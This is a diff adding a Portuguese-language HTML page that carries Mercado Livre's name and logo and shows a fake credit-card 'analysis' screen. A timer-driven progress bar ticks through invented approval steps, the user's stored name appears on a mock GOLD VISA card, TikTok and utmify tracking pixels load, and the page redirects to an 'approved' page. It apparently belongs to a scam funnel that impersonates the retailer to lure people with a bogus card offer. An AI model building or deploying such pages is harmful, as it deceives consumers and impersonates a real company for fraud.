@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Processando...</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .proc-page {
+            background: #f5f5f5;
+            min-height: calc(100vh - 56px);
+            padding: 20px 18px 32px;
+        }
+
+        .processing-header {
+            text-align: center;
+            margin-bottom: 24px;
+            margin-top: 8px;
+        }
+
+        .processing-header h2 {
+            font-size: 21px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+            line-height: 1.25;
+        }
+
+        .processing-header p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.45;
+        }
+
+        .proc-progress {
+            margin-bottom: 22px;
+        }
+
+        .proc-progress .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+
+        .proc-progress .progress-bar-bg {
+            height: 7px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .proc-progress .progress-bar-fill {
+            background: #ffe600;
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.45s ease;
+        }
+
+        .fake-card {
+            border-radius: 16px;
+            padding: 18px 18px 16px;
+            width: 100%;
+            height: 196px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.12);
+            position: relative;
+            margin-bottom: 28px;
+            overflow: hidden;
+        }
+
+        /* Mesmas cores de personalizar.html (sessionStorage mlCardColor) */
+        .fake-card.yellow {
+            background: linear-gradient(135deg, #f5c100 0%, #ffde00 100%);
+        }
+
+        .fake-card.black {
+            background: linear-gradient(135deg, #222 0%, #444 100%);
+        }
+
+        .fake-card.blue {
+            background: linear-gradient(135deg, #3483fa 0%, #2968c8 100%);
+        }
+
+        .fake-card.black .card-tier,
+        .fake-card.black .card-name,
+        .fake-card.black .card-brand,
+        .fake-card.black .card-contactless {
+            color: #fff;
+        }
+
+        .fake-card.blue .card-tier,
+        .fake-card.blue .card-name,
+        .fake-card.blue .card-brand,
+        .fake-card.blue .card-contactless {
+            color: #fff;
+        }
+
+        .fake-card.black .card-logo-row img,
+        .fake-card.blue .card-logo-row img {
+            filter: brightness(0) invert(1);
+        }
+
+        .fake-card.black .card-chip,
+        .fake-card.blue .card-chip {
+            background: linear-gradient(145deg, #c4c4c4, #eaeaea, #9a9a9a);
+        }
+
+        .fake-card .card-logo-row {
+            display: flex;
+            align-items: center;
+        }
+
+        .fake-card .card-logo-row img {
+            height: 26px;
+            width: auto;
+            display: block;
+        }
+
+        .card-tier {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            font-size: 12px;
+            font-weight: 800;
+            letter-spacing: 0.12em;
+            color: #1a1a1a;
+        }
+
+        .card-chip {
+            width: 44px;
+            height: 34px;
+            background: linear-gradient(145deg, #cfa855, #e8d4a0, #a8843a);
+            border-radius: 6px;
+            position: absolute;
+            top: 56px;
+            left: 18px;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.35);
+        }
+
+        .card-contactless {
+            position: absolute;
+            top: 60px;
+            right: 18px;
+            color: #1a1a1a;
+        }
+
+        .card-name {
+            position: absolute;
+            bottom: 18px;
+            left: 18px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: #1a1a1a;
+            font-size: 11px;
+            max-width: 62%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .card-brand {
+            position: absolute;
+            bottom: 16px;
+            right: 18px;
+            font-size: 22px;
+            font-weight: 800;
+            font-style: italic;
+            color: #1a1a1a;
+            letter-spacing: -0.02em;
+        }
+
+        .status-list {
+            padding: 0 4px;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .status-item.active {
+            color: #555;
+        }
+
+        .status-item.active strong {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .status-icon {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            margin-right: 14px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 800;
+            border: 2px solid #ddd;
+            background: #fff;
+            color: transparent;
+        }
+
+        .status-item.active .status-icon {
+            border-color: #00a650;
+            background: #00a650;
+            color: #fff;
+        }
+
+        .status-item.loading .status-icon {
+            border: 3px solid #ffe600;
+            border-top-color: rgba(0, 0, 0, 0.15);
+            background: transparent;
+            color: transparent;
+            animation: spin 0.85s linear infinite;
+        }
+
+        .status-item.pending .status-icon {
+            border-color: #e0e0e0;
+            background: #fafafa;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="personalizar.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round"></path>
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="proc-page">
+            <div class="processing-header">
+                <h2>Aguarde enquanto processamos seu pedido</h2>
+                <p>Estamos finalizando sua análise para liberar seu cartão.</p>
+            </div>
+
+            <div class="proc-progress">
+                <div class="progress-info">
+                    <span>Processamento em andamento</span>
+                    <span id="percentText">0%</span>
+                </div>
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="barFill" style="width: 0%;"></div>
+                </div>
+            </div>
+
+            <div class="fake-card yellow" id="procFakeCard" aria-hidden="true">
+                <div class="card-logo-row">
+                    <img src="images/Mercado-Livre-logo.png" alt="">
+                </div>
+                <div class="card-tier">GOLD</div>
+                <div class="card-chip"></div>
+                <div class="card-contactless">
+                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M6.5 9.5C6.5 8 8 6.5 9.5 6.5" stroke="currentColor" stroke-width="1.25"
+                            stroke-linecap="round"></path>
+                        <path d="M5 12C5 8.5 7.5 6 11 6" stroke="currentColor" stroke-width="1.25"
+                            stroke-linecap="round"></path>
+                        <path d="M5 14.5C5 9.5 9 5.5 14 5.5" stroke="currentColor" stroke-width="1.25"
+                            stroke-linecap="round"></path>
+                    </svg>
+                </div>
+                <div class="card-name" id="procCardName">ADALBERTO COSTA</div>
+                <div class="card-brand">VISA</div>
+            </div>
+
+            <div class="status-list">
+                <div class="status-item loading" id="status1">
+                    <div class="status-icon"></div>
+                    <span><strong>Aguardando resposta</strong></span>
+                </div>
+                <div class="status-item pending" id="status2">
+                    <div class="status-icon"></div>
+                    <span>Analisando seu perfil</span>
+                </div>
+                <div class="status-item pending" id="status3">
+                    <div class="status-icon"></div>
+                    <span>Preparando seu cartão</span>
+                </div>
+                <div class="status-item pending" id="status4">
+                    <div class="status-icon"></div>
+                    <span>Finalizando solicitação</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        function displayNameForCard() {
+            try {
+                var n = sessionStorage.getItem("mlNome");
+                if (n && n.trim().length >= 2) {
+                    return n.trim().toUpperCase();
+                }
+            } catch (e) { }
+            return "ADALBERTO COSTA";
+        }
+
+        document.getElementById("procCardName").textContent = displayNameForCard();
+        (function applyMlCardColor() {
+            try {
+                var c = (sessionStorage.getItem("mlCardColor") || "yellow").toLowerCase();
+                if (c !== "yellow" && c !== "black" && c !== "blue") c = "yellow";
+                var card = document.getElementById("procFakeCard");
+                if (card) card.className = "fake-card " + c;
+            } catch (e) { }
+        })();
+
+        function setStatusComplete(id) {
+            var el = document.getElementById(id);
+            el.classList.remove("loading", "pending");
+            el.classList.add("active");
+            var ic = el.querySelector(".status-icon");
+            ic.textContent = "✓";
+        }
+
+        function setStatusLoading(id) {
+            var el = document.getElementById(id);
+            el.classList.remove("pending", "active");
+            el.classList.add("loading");
+            el.querySelector(".status-icon").textContent = "";
+        }
+
+        function setBar(p) {
+            document.getElementById("barFill").style.width = p + "%";
+            document.getElementById("percentText").textContent = p + "%";
+        }
+
+        setTimeout(function () {
+            setBar(25);
+            setStatusComplete("status1");
+            setStatusLoading("status2");
+        }, 1200);
+
+        setTimeout(function () {
+            setBar(50);
+            setStatusComplete("status2");
+            setStatusLoading("status3");
+        }, 2600);
+
+        setTimeout(function () {
+            setBar(75);
+            setStatusComplete("status3");
+            setStatusLoading("status4");
+        }, 4000);
+
+        setTimeout(function () {
+            setBar(100);
+            setStatusComplete("status4");
+            setTimeout(function () {
+                window.location.href = "../aprovado/index.html";
+            }, 900);
+        }, 5400);
+    </script>
+
+
+</body>
+
+</html>
